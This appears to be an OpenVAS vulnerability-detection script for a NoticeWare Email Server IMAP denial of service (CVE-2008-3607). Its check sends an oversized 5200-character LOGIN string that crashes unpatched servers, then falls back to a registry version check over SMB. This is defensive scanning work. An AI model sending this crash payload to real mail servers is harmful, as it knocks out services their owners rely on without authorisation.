##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_noticeware_email_svr_dos_vuln_900027.nasl 9349 2018-04-06 07:02:25Z cfischer $
# Description: NoticeWare Email Server NG LOGIN Messages DoS Vulnerability
#
# Authors:
# Chandan S <schandan@secpod.com>
#
# Copyright:
# Copyright (C) 2008 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
##############################################################################

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.900027");
 script_version("$Revision: 9349 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:02:25 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2008-08-22 10:29:01 +0200 (Fri, 22 Aug 2008)");
 script_cve_id("CVE-2008-3607");
 script_bugtraq_id(30605);
 script_copyright("Copyright (C) 2008 SecPod");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"registry");
 script_family("Denial of Service");
 script_name("NoticeWare Email Server NG LOGIN Messages DoS Vulnerability");
 script_dependencies("find_service.nasl", "secpod_reg_enum.nasl");
 script_mandatory_keys("SMB/WindowsVersion");
 script_require_ports(139, 445, "Services/imap", 143); 
 script_tag(name : "affected" , value : "Noticeware Email Server 4.6.3 and prior on Windows (All).");
 script_tag(name : "insight" , value : "Security flaw is due to improper bounds checking of the user supplied
data to imap LOGIN command (Long string of 5000 characters on tcp/143).");
 script_tag(name : "summary" , value : "The host is running NoticeWare Email Server, which is prone to
denial of service vulnerability.");
 script_tag(name : "solution" , value : "Upgrade to Noticeware Email Server 5.1,
http://www.noticeware.com/downloads.htm");
 script_tag(name : "impact" , value : "Remote attackers can crash or deny the service by executing
long LOGIN string.
Impact Level : Application");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/495259");
 exit(0);
}


 include("smb_nt.inc");
 include("imap_func.inc");

 imap_port = get_kb_item("Services/imap");
 if(!imap_port){
	imap_port = 143;
 }

 if(!get_port_state(imap_port)){
        exit(0);
 }

 if(!get_kb_item("SMB/WindowsVersion")){
        exit(0);
 }

 banner = get_imap_banner(port:imap_port);
 if("NoticeWare" >!< banner){
	exit(0);
 }

 if(!safe_checks())
 {
	sock = open_sock_tcp(imap_port);
        if(!sock){
		exit(0);
	}

	data = string("A001 LOGIN ", crap(data:"A", length:5200), " \r\n");
        send(socket:sock, data:data);
        rcv = recv(socket:sock, length:1024);
        close(sock);
	sleep(20);

        sock = open_sock_tcp(imap_port);
        if(sock)
        {
		send(socket:sock, data:data);
                rcv = recv(socket:sock, length:1024);
                close(sock);
        }

	if("NoticeWare" >!< rcv){
		security_message(imap_port);
		log_message(data:string("NoticeWare Email Server service has been " +
					  "crashed on the target system.\nRestart the " +
					  "service to resume normal operations."),
			      port:imap_port);

	} 
	exit(0);
 }

 # Check for NoticeWare EmailServer Installation
 if(!registry_key_exists(key:"SOFTWARE\NoticeWare\EmailServer")){
	exit(0);
 }

 name = kb_smb_name();
 login = kb_smb_login();
 domain = kb_smb_domain();
 pass = kb_smb_password();
 port = kb_smb_transport();
 
 soc = open_sock_tcp(port);
 if(!soc){
        exit(0); 
 }

 r = smb_session_request(soc:soc, remote:name);
 if(!r){
        close(soc);
        exit(0);
 }
 
 prot = smb_neg_prot(soc:soc) ;
 if(!prot){
        close(soc);
        exit(0);
 }
 
 r = smb_session_setup(soc:soc, login:login, password:pass, domain:domain, prot:prot);
 if(!r)
 {
	close(soc);
        exit(0);
 }

 uid = session_extract_uid(reply:r);
 if(!uid)
 {
	close(soc);
        exit(0);
 }

 r = smb_tconx(soc:soc, name:name, uid:uid, share:"IPC$");
 if(!r)
 {
	close(soc);
        exit(0);
 }

 tid = tconx_extract_tid(reply:r);
 if (!tid){
        close(soc);
        exit(0);
 }

 r = smbntcreatex(soc:soc, uid:uid, tid:tid, name:"\winreg");
 if(!r){
        close(soc);
        exit(0);
 }

 pipe = smbntcreatex_extract_pipe(reply:r);
 if (!pipe){
        close(soc);
        exit(0);
 }

 r = pipe_accessible_registry(soc:soc, uid:uid, tid:tid, pipe:pipe);
 if(!r){
        close(soc);
        exit(0);
 }

 handle = registry_open_hklm(soc:soc, uid:uid, tid:tid, pipe:pipe);
 if(!handle){
        close(soc);
        exit(0);
 }

 key = "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\";
 key_h = registry_get_key(soc:soc, uid:uid ,tid:tid ,pipe:pipe,key:key,reply:handle);
 if(!key_h){
	close(soc);
        exit(0);
 }

 entries = registry_enum_key(soc:soc, uid:uid, tid:tid, pipe:pipe, reply:key_h);
 close(soc);

 foreach entry (entries)
 {
        mailName = registry_get_sz(key:key + entry, item:"DisplayName");
        if("NoticeWare Email Server" >< mailName)
        {
		mailVer = registry_get_sz(key:key + entry, item:"DisplayVersion");
                if(egrep(pattern:"^([0-3]\..*|4\.[0-5](\..*)?|4\.6(\.[0-3])?)$",
			 string:mailVer)){
                        security_message(imap_port);
                }
                exit(0);
        }
 }
